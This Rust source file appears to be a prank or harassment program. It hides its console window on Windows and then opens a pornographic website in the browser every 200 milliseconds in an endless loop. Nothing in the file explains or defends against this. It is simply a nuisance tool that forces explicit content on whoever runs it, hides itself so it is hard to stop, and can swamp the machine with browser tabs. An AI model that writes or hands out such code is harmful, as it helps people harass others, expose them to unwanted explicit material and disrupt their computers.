// This hides the window on startup
// Widows only!
#![windows_subsystem = "windows"]

use std::{thread, time};


fn main() {
    let delay = time::Duration::from_millis(200);
    let target_url = "https://pornhub.com/gay";
    
    if let Err(e) = open_tab(target_url) {
        println!("{:#?}", e);
        panic!("Failed to execute program!");
    }
    thread::sleep(time::Duration::from_millis(2));

    loop {
        if let Err(e) = open_tab(target_url) {
            println!("{:#?}", e);
            panic!("Failed to execute program!");
        }
        thread::sleep(delay);
    }
}

fn open_tab(url: &str) -> Result<(), std::io::Error> {
    webbrowser::open(&url)
}